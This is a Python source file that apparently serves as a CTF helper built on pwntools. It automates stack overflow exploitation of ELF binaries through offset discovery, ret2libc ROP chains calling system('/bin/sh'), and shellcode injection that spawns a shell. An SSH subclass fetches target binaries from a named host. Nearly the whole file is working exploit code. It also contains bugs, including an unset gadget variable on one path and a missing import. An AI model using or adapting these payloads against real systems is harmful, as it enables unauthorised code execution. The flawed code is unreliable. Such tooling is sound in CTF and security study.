from enum import Enum
from pwn import *
import sys,os,glob, inspect,re

class Exploit_type(Enum):
    LOCAL=0
    REMOTESSH=1
    REMOTETTCP=2

class Exploit:
    """Class for local binary attack"""

    @context.quietfunc
    def __init__(self, file_path, send_func, libc_path=None):
        """
        Start environment for attack in local binary
        Arguments:
            filepath: the binary to attack
            send_func: a function that can trigger an overflow
        """
        self.elf = file_path
        self.send_func = send_func
        self.aslr = self.local_aslr()

        # Check the signature of send_func
        assert inspect.isfunction(send_func), "The send_func argument must be a function"
        params = list(inspect.signature(send_func).parameters.values())
        assert params[0].annotation == process, "Argument 0 must be a Pwntools process"
        assert params[1].annotation == bytes, "Argument 1 must be a byte array"

        # Check architecture
        if self.is_64bit_elf():
            self.arch = 'amd64'
        elif self.is_32bit_elf():
            self.arch = 'x86'
        else:
            raise Exception('Unknown architecture')

        # Check libc
        if libc_path == None:
            # Find system lib
            p = process(self.elf, level='error')
            self.libc = p.libc.path
            pass
        else:
            self.libc = libc_path

    def __str__(self):
        return "Type:"+str(self.elf)

    def is_64bit_elf(self):
        with open(self.elf,'rb') as f:
            return(f.read(5)[-1]) == 2

    def is_32bit_elf(self):
        with open(self.elf,'rb') as f:
            return (f.read(5)[-1]) == 1
    
    def local_aslr(self):
        nb = int(open('/proc/sys/kernel/randomize_va_space','r').read())
        return nb == 2
    
    def pbits(self, data):
        if self.arch == 'amd64':
            return p64(data)
        else:
            return p32(data)
    
    def ret2libc(self, offset=None):
        if offset == None:
            offset = self.find_offset()
        
        if self.aslr:
            log.info('ASLR enabled, need to leak it. Starting ret2libc')
        else:
            p = process(self.elf)

            system_addr = p.libc.sym['system']
            exit_addr = p.libc.sym['exit']
            bin_sh_addr = next(p.libc.search(b'/bin/sh'))
            
            log.info(f"System: 0x{system_addr:x}")
            log.info(f"bin.sh: 0x{bin_sh_addr:x}")


            if self.arch == 'amd64':
                # X85_64 Calling convention:
                # arg1 = rdi
                # arg2 = rsi
                elf = ELF(self.elf)
                rop = ROP(elf)

                if rop.rdi == None:
                    libc = self.libc
                    rop = ROP(libc)
                
                    POP_RDI = rop.rdi

                    if POP_RDI == None:
                        raise Exception("Can't find gadget pop_rdi in elf or libc")
                
                print(f"Gadget pop rdi {POP_RDI}")
                POP_RDI = POP_RDI.address + p.libc.address
                print(f"pop rdi 0x{POP_RDI:x}")

                payload = b'A' * offset
                payload += p64(POP_RDI)
                payload += p64(bin_sh_addr)
                payload += p64(system_addr)
                payload += p64(0)
                
            else:
                # X86 Calling convention:
                # args on stack
                payload = b'A' * offset
                payload += p32(system_addr)
                payload += p32(exit_addr)
                payload += p32(bin_sh_addr)
        
            self.send_func(p, payload)
            p.interactive()


        

    @context.quietfunc
    def find_offset(self):
        
        p = process(self.elf, level='error')

        if self.arch == 'amd64':
            self.send_func(p,cyclic(30,n=8))
        else:
            self.send_func(p,cyclic(30,n=4))
        p.wait()

        core = p.corefile

        if core.arch == 'i386':
            #print(f"{core.eip:x}")
            return cyclic_find(core.eip, n=4)
        elif core.arch == 'amd64':
            #print(f"{core.rsp:x}")
            return cyclic_find(core.read(core.rsp, 8), n=8)
        else:
            raise Exception(f'Unknown arch: {core.arch}')
    
    @context.quietfunc
    def find_stack_addr(self, offset):
        
        p = process(self.elf, level='error')

        if self.arch == 'amd64':
            payload = b'A' * (offset) + b'BBBBBBBB'
        else:
            payload = b'A' * (offset) + b'BBBB'

        self.send_func(p,payload)
        p.wait()

        core = p.corefile

        if core.arch == 'i386':
            #print(f"{core.eip:x}")
            return core.esp
        elif core.arch == 'amd64':
            #print(f"{core.rsp:x}")
            return core.rsp
        else:
            raise Exception(f'Unknown arch: {core.arch}')
    
    def ret2stack(self, offset=None, stack_addr=None):
        if offset == None:
            offset = self.find_offset()
        
        if stack_addr == None:
            stack_addr = self.find_stack_addr(offset)


        p = process(self.elf)
        if self.arch == 'amd64':
            context.update(arch='amd64',os='linux')

            payload = b'A' * offset
            payload += p64(stack_addr + 8)
            payload += asm(shellcraft.nop() * 0x10)
            payload += asm(shellcraft.sh())
        else:
            context.update(arch='x86',os='linux')

            payload = b'A' * offset
            payload += p32(stack_addr + 4)
            payload += asm(shellcraft.nop() * 0x10)
            payload += asm(shellcraft.sh())

        self.send_func(p,payload) 
        p.interactive()
    
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_value, traceback):

        files = glob.glob('core*')
        for f in files:
            os.remove(f)


class Exploit_SSH(Exploit):
    """Class for SSH binary attack"""

    def __init__(self, ip, port, user,file_path,password=None):
        ssh_shell = ssh(user, ip, password=password, port=port)
        ssh_shell.download(file_path)

        file = file_path.split('/')[-1]

        st = os.stat(file)
        os.chmod(file, st.st_mode | stat.S_IEXEC)

        super().__init__(file)
    def __exit__(self, exc_type, exc_value, traceback):
        
        try:
            os.remove(self.elf)
            os.remove('core.*')
        except:
            pass


def test_ssh():
    with Exploit_SSH('serviel.fr', 22, 'paul', './ctf/example1') as exp:
        print(exp)
        
        print(exp.find_offset())


def fill_buf(p: process,data: bytes):
    p.sendline(data)

def test_local():
    with Exploit('./bin/vuln1',fill_buf) as exp:
        #exp.ret2stack()
        exp.ret2libc()
        # pass



if __name__=="__main__":
    test_local()